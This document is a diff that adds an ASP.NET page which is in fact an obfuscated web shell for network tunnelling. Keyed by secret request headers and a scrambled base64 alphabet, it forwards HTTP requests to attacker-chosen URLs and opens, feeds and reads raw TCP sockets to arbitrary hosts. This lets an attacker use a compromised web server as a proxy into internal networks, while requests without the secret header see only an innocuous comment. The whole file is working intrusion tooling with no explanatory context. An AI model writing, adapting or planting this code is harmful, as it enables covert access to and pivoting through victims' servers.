@@ -1,0 +1,148 @@
+<%@ Page Language="C#" EnableSessionState="True"%>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Net" %>
+<%@ Import Namespace="System.Net.Sockets" %>
+<%@ Import Namespace="System.Collections" %>
+<script runat="server">
+    public String StrTr(string input, string frm, string to) {
+        String r = "";
+        for(int i=0; i< input.Length; i++) {
+            int index = frm.IndexOf(input[i]);
+            if(index != -1)
+                r += to[index];
+            else
+                r += input[i];
+        }
+        return r;
+    }
+</script>
+<%
+    try
+    {
+        String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        String de = "EgTqubIoa+PXYwMs972kBiZRfjyVLlNpA/S1zmc3FJxCGW6n4ve5htHQdK8UOD0r";
+        String rUrl = Request.Headers.Get("Dwzoohqcwdatv");
+        if (rUrl != null){
+            Uri u = new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(StrTr(rUrl, de, en))));
+            WebRequest request = WebRequest.Create(u);
+            request.Method = Request.HttpMethod;
+            
+            foreach (string key in Request.Headers)
+            {
+                if (key != "Dwzoohqcwdatv"){
+                    try{
+                        request.Headers.Add(key, Request.Headers.Get(key));
+                    } catch (Exception e){}
+                }
+            }
+
+            int buffLen = Request.ContentLength;
+            byte[] buff = new byte[buffLen];
+            int c = 0;
+            if((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
+                System.Text.Encoding.Default.GetString(buff);
+                try{
+                    Stream body = request.GetRequestStream();
+                    body.Write(buff, 0, buff.Length);
+                    body.Close();
+                } catch (Exception e){}
+            }
+
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            WebHeaderCollection webHeader = response.Headers;
+            for (int i=0;i < webHeader.Count; i++)
+            {
+                string rkey = webHeader.GetKey(i);
+                if (rkey != "Content-Length" && rkey != "Transfer-Encoding")
+                    Response.AddHeader(rkey, webHeader[i]);
+            }
+
+            StreamReader repBody = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("UTF-8"));
+            string rbody = repBody.ReadToEnd();
+            Response.AddHeader("Content-Length", rbody.Length.ToString());
+            Response.Write(rbody);
+            return;
+        }
+        Response.StatusCode = 200;
+        String cmd = Request.Headers.Get("Dwmhjemfccjy");
+        if (cmd != null) {
+            String mark = cmd.Substring(0,22);
+            cmd = cmd.Substring(22);
+            if (cmd == "b7t4EnDLD10d2") {
+                try {
+                    String target_str = System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(Request.Headers.Get("Opm"), de, en)));
+                    String[] target_ary = target_str.Split('|');
+                    String target = target_ary[0];
+                    int port = int.Parse(target_ary[1]);
+                    IPAddress ip;
+                    try {
+                        ip = IPAddress.Parse(target);
+                    } catch (Exception ex) {
+                        IPHostEntry host = Dns.GetHostByName(target);
+                        ip = host.AddressList[0];
+                    }
+                    System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
+                    Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    sender.Connect(remoteEP);
+                    sender.Blocking = false;
+                    Application.Add(mark, sender);
+                    Response.AddHeader("Yvfjhrpsceyy", "BEOaj9RYCGrRZ51iA1IbPgBt1");
+                } catch (Exception ex) {
+                    Response.AddHeader("Zbwhybunqtwsuhmfp", "N69AVuiCplI2t9BF4BfMOTq4quxJ4ABPz1O_13SUNqjUxx47hymmnJVR");
+                    Response.AddHeader("Yvfjhrpsceyy", "wwfwIzJMHVIEGHGCWJ4yT6pJsYaEU8o");
+                }
+            } else if (cmd == "1kkHD6LGywpdJP1uLD0UebSY") {
+                try {
+                    Socket s = (Socket)Application[mark];
+                    s.Close();
+                } catch (Exception ex){
+                }
+                Application.Remove(mark);
+            } else if (cmd == "pyM7oB8i0Vewg8Rof0NtuTTBsjjb53e8YG7N2kLK7tugo8ainXRdMea5uc4KFKL") {
+                Socket s = (Socket)Application[mark];
+                try {
+                    int buffLen = Request.ContentLength;
+                    byte[] buff = new byte[buffLen];
+                    int c = 0;
+                    while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
+                        string b64 = StrTr(System.Text.Encoding.Default.GetString(buff), de, en);
+                        s.Send(Convert.FromBase64String(b64));
+                    }
+                    Response.AddHeader("Yvfjhrpsceyy", "BEOaj9RYCGrRZ51iA1IbPgBt1");
+                } catch (Exception ex) {
+                    Response.AddHeader("Zbwhybunqtwsuhmfp", "1tXidPrVL8fIXfrvwB5aDELuFYUThv1");
+                    Response.AddHeader("Yvfjhrpsceyy", "wwfwIzJMHVIEGHGCWJ4yT6pJsYaEU8o");
+                }
+            } else if (cmd == "XCouLsmxuEUY7vYUR2jQtiCgrcoXrXqt0MBwoBeL1RVNv5YU_nQK9") {
+                try {
+                    Socket s = (Socket)Application[mark];
+                    byte[] readBuff = new byte[513];
+                    int maxRead = 524288;
+                    int readLen = 0;
+                    try {
+                        int c = s.Receive(readBuff);
+                        while (c > 0) {
+                            byte[] newBuff = new byte[c];
+                            System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
+                            string b64 = Convert.ToBase64String(newBuff);
+                            Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(b64, en, de)));
+                            readLen += c;
+                            if (c < 513 || readLen >= maxRead)
+                                break;
+                            c = s.Receive(readBuff);
+                        }
+                        Response.AddHeader("Yvfjhrpsceyy", "BEOaj9RYCGrRZ51iA1IbPgBt1");
+                    } catch (SocketException soex) {
+                        Response.AddHeader("Yvfjhrpsceyy", "BEOaj9RYCGrRZ51iA1IbPgBt1");
+                    }
+                } catch (Exception ex) {
+                    Response.AddHeader("Yvfjhrpsceyy", "BEOaj9RYCGrRZ51iA1IbPgBt1");
+                }
+            }
+        } else {
+            Response.Write("<!-- fKzxoj01tFv3ZTnARb9LxO7LNHK7Gc7N6AQrwZ6htony43S4xijhS -->");
+        }
+    } catch (Exception ex) {
+        Response.AddHeader("Yvfjhrpsceyy", "wwfwIzJMHVIEGHGCWJ4yT6pJsYaEU8o");
+    }
+%>
